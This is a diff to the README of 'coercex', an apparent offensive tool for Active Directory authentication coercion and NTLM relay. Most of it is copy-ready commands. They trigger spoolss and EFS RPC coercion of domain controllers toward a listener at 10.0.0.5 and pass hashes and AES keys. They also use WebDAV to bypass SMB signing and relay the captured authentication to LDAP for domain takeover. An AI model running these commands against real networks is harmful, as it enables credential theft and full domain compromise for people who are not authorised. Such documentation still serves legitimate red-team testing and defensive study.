@@ -45,10 +45,11 @@ coercex scan -t dc01 -u user -p pass --pipes '\PIPE\spoolss'
 coercex scan -t dc01.corp.local -u user -H aad3b435b51404ee:abc123... -d corp --concurrency 200
 ```
 
-### Coerce with listener
+### Coerce with external relay
 
 ```bash
-# Trigger coercion and capture NTLM auth callbacks
+# Trigger coercion pointing at your relay (ntlmrelayx, etc.)
+# coercex does NOT bind any ports -- it only sends RPC triggers
 coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
 
 # Coerce with specific methods from scan results
@@ -57,14 +58,25 @@ coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --methods 'EfsRpcOpenFileRaw'
 # Coerce via specific protocol + pipe
 coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --protocols MS-RPRN --pipes '\PIPE\spoolss'
 
-# Via WebDAV to bypass SMB signing
+# Via WebDAV only (bypass SMB signing)
 coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport http
+
+# Via SMB only
+coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport smb
+
+# Both transports (default)
+coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport smb --transport http
 ```
 
 ### Relay coerced authentication
 
 ```bash
-# Relay to LDAP for domain takeover (DCSync, DA add, ACL attack)
+# Relay to LDAP for domain takeover (auto-detect listener IP)
+coercex relay -t dc01.corp.local \
+  --relay-to ldap://dc02.corp.local \
+  -u user -p pass -d corp.local
+
+# Explicit listener IP
 coercex relay -t dc01.corp.local -l 10.0.0.5 \
   --relay-to ldap://dc02.corp.local \
   -u user -p pass -d corp.local
@@ -130,11 +142,11 @@ coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local -d 
 
 ## Modes
 
-| Mode | Listener | Description |
-|------|----------|-------------|
-| `scan` | Optional | Try all path styles per method to detect vulnerabilities. Without `-l`, classifies RPC error codes only. With `-l`, also confirms actual callbacks. |
-| `coerce` | Required | Trigger coercion using specific or all methods with a single path style per method. Use `--methods`/`--pipes` to target results from scan. |
-| `relay` | Required | Try all path styles (like scan) but through impacket relay servers that capture and relay NTLM auth. |
+| Mode | Listener | Binds Ports | Transport | Description |
+|------|----------|-------------|-----------|-------------|
+| `scan` | Optional (`-l`) | HTTP+SMB when `-l` given | `--transport smb http` (default: both) | Try all path styles per method. Without `-l`, classifies by RPC error codes. With `-l`, confirms callbacks. |
+| `coerce` | **Required** (`-l`) | **None** (external relay) | `--transport smb http` (default: both) | Fire coercion at `--listener` where your relay (e.g. ntlmrelayx) is already running. |
+| `relay` | Optional (`-l`) | HTTP+SMB relay servers | `--transport smb http` (default: both) | Try all path styles through impacket relay servers. If `-l` omitted, auto-detects local IP. |
 
 ## Filtering
 
